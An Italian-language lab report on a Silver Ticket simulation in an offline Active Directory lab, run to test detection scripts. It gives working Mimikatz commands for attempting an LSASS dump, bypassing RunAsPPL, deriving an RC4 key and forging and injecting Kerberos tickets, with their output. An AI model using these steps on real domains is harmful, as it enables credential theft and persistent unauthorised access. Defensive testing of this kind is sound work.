# Silver Ticket – Test LAB AD offline

## 1. Scopo del test

Questo documento sintetizza la simulazione di attacco **Silver Ticket** svolta nell’ambiente Active Directory di laboratorio offline.

Il test è stato condotto in continuità con il precedente test di **Kerberoasting**, riutilizzando lo stesso honey-object/account di servizio `admin.backup` e lo stesso SPN di laboratorio `SERVICE/testservice`

Questo prerequisito è essenziale perché un Silver Ticket richiede il materiale crittografico dell’account associato al servizio, in particolare la chiave **RC4/NTLM** se si lavora con ticket di tipo RC4.

Obiettivi:

- generare un ticket Kerberos;
- iniettarlo nella sessione corrente;
- verificarne la presenza tramite `klist`;
- valutare se gli script di detection del piano di test intercettano questi eventi.

---

## 2. Primo tentativo: recupero hash NTLM da LSASS

Seguendo il flusso previsto dal materiale del Laboratorio il privilegio di debug è risultato disponibile;  
il recupero delle credenziali da LSASS ha restituito l’errore atteso `ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list`

È stata quindi applicato il workaround pevisto con la modifica del valore `RunAsPPL`, seguita dal riavvio del Domain Controller.

Nonostante questo, il tentativo con `sekurlsa::logonPasswords` ha continuato a fallire con lo stesso errore.

### Valutazione con supporto della AI

Il Silver Ticket non dipende solo dalla conoscenza della password dell’account di servizio, ma dalla disponibilità della chiave crittografica corretta.

Poiché il precedente test Kerberoasting aveva già permesso di recuperare la password di `admin.backup`, si è scelto di non insistere ulteriormente sul dump di LSASS e di derivare la chiave RC4/NTLM direttamente dalla password nota.

---

## 3. Calcolo della chiave RC4/NTLM

Comando utilizzato:

```text
kerberos::hash /password:<PASSWORD_ADMIN_BACKUP> /user:admin.backup /domain:AD-LAB-DOMAIN.LOCAL
```

Output rilevante:

```text
rc4_hmac_nt : 5611...5ea7
```

> Nota: nel presente documento il valore completo della password e dell’hash non viene riportato integralmente. I valori completi sono presenti solo negli output tecnici di laboratorio, dove necessari alla riproducibilità del test.

---

## 4. Recupero del SID di dominio

È stato recuperato il SID del dominio tramite PowerShell:

```powershell
(Get-ADDomain).DomainSID.Value
```

Output:

```text
S-1-5-21-583327331-4094284534-4084356956
```

Questo valore è stato utilizzato per costruire il ticket Kerberos.

---

## 5. Generazione del primo Silver Ticket

Il primo ticket è stato generato con un utente arbitrario, secondo la logica classica della simulazione:

```text
/user:whatever
```

Comando strutturale:

```text
kerberos::golden /domain:AD-LAB-DOMAIN.LOCAL   /sid:S-1-5-21-583327331-4094284534-4084356956   /user:whatever   /rc4:<RC4_NTLM_ADMIN_BACKUP>   /service:SERVICE   /target:testservice   /ptt
```

Output rilevante:

```text
User      : whatever
Domain    : AD-LAB-DOMAIN.LOCAL (AD-LAB-DOMAIN)
SID       : S-1-5-21-583327331-4094284534-4084356956
Service   : SERVICE
Target    : testservice
Lifetime  : 21/06/2026 11:30:10 ; 18/06/2036 11:30:10 ; 18/06/2036 11:30:10
Ticket    : ** rimosso **

Golden ticket for 'whatever @ AD-LAB-DOMAIN.LOCAL' successfully submitted for current session
```

Anche se Mimikatz riporta la dicitura “Golden ticket”, in questo contesto il ticket generato è stato usato come **Silver Ticket**, perché limitato a uno specifico servizio (`SERVICE/testservice`) e costruito con la chiave dell’account di servizio, non con la chiave `krbtgt`.

---

## 6. Verifica con `klist`

La cache Kerberos locale ha confermato la presenza del ticket:

```text
Client: whatever @ AD-LAB-DOMAIN.LOCAL
Server: SERVICE/testservice @ AD-LAB-DOMAIN.LOCAL
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
End Time: 6/18/2036 11:30:10
Renew Time: 6/18/2036 11:30:10
KDC chiamato: "vuoto" (coerente con un ticket forgiato e iniettato localmente)
```

---

## 7. Verifica con gli script del piano di test

Sono stati eseguiti i controlli previsti dal piano di test.

### Test-07.02

Il controllo dedicato alla verifica dell’esito del Silver Ticket è risultato coerente con la simulazione.

### Test-06.01

Lo script di controllo relativo all’honey-object `admin.backup` non ha raccolto nuove evidenze nella prima esecuzione, perché legato all'utente whatever

In questo caso `admin.backup` è stato utilizzato come **chiave del servizio**, ma l’identità dichiarata nel ticket era `whatever`. Di conseguenza, uno script che monitora attività riconducibili all’utente `admin.backup` può non rilevare eventi associati a tale account.

---

## 8. Secondo ticket: identità client `admin.backup`

Svuotata la cache Kerberos è stato quindi generato un secondo ticket indicando direttamente `admin.backup` come utente client:

```text
kerberos::golden /domain:AD-LAB-DOMAIN.LOCAL   /sid:S-1-5-21-583327331-4094284534-4084356956   /user:admin.backup   /rc4:<RC4_NTLM_ADMIN_BACKUP>   /service:SERVICE   /target:testservice   /ptt
```

Verifica tramite `klist`:

```text
Client: admin.backup @ AD-LAB-DOMAIN.LOCAL
Server: SERVICE/testservice @ AD-LAB-DOMAIN.LOCAL
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
End Time: 6/18/2036 11:47:39
Renew Time: 6/18/2036 11:47:39
KDC chiamato:
```

Anche in questo caso il ticket è risultato correttamente iniettato nella sessione corrente.

Tuttavia, lo script `Test-06.01` non ha prodotto nuove evidenze significative; probabilemnte perché il servizio è fake e non ha prodotto "movimenti" reali.


---


## 9. Simulazione di invocazione  del servizio violato

È stato infine tentato un utilizzo del ticket tramite richiesta Kerberos verso lo stesso SPN:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SERVICE/testservice'
```

Output rilevante:

```text
ServicePrincipalName : SERVICE/testservice
ValidFrom            : 21/06/2026 09:47:39
ValidTo              : 18/06/2036 09:47:39
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

La richiesta ha confermato la presenza e l’utilizzo locale del ticket Kerberos per lo SPN indicato.

---

## 10. Conclusioni


### Esiti Raccolti

`SERVICE/testservice` è uno SPN di laboratorio associato all’honey-object `admin.backup`, ma non risulta collegato a un servizio applicativo reale che accetti effettivamente ticket Kerberos per autorizzare accessi a una risorsa.

Attività Verificate:
- la generazione del Silver Ticket è stata verificata;
- l’iniezione nella cache Kerberos è stata verificata;
- la durata anomala del ticket è stata verificata;
- la simulazione d’uso Kerberos locale è stata verificata;
- non sono però stati prodotti eventi applicativi forti lato servizio target.

---

### Servizio Violato

La rimozione del ticket dalla cache locale tramite `klist purge` elimina l’evidenza immediata visibile con `klist` e impedisce nuove presentazioni del ticket da quella sessione.  

Tuttavia, se un ticket fosse già stato presentato e accettato da un servizio reale, l’eliminazione dalla cache non annullerebbe retroattivamente le attività già eseguite.  

In uno scenario con servizio reale, gli eventi andrebbero cercati non solo sulla macchina che ha generato il ticket, ma anche sui log del sistema o del servizio destinatario.

---


### Utilizzo AI

È stato utile per:

- proporre il calcolo della chiave RC4/NTLM dalla password già nota;
- chiarire la differenza tra account usato come chiave del servizio e identità client nel ticket;
- interpretare l’assenza di evidenze dello script di controllo;
- formulare le conclusioni sul limite della simulazione.

---

## 15. Rimando agli esiti raccolti

Per gli output completi del piano di test e delle verifiche eseguite, fare riferimento ai file di esito associati al test, in particolare:


- [Esito Primo SilverTicket](./Evidenze/Test-07.02_1.out)
- [I Audit su Admin.Bakup ](./Evidenze/Test-06.01_3.out)
- [Esito Secondo SilverTicket](./Evidenze/Test-07.02_2.out)
- [II Audit su Admin.Bakup ](./Evidenze/Test-06.01_4.out) (FAIL)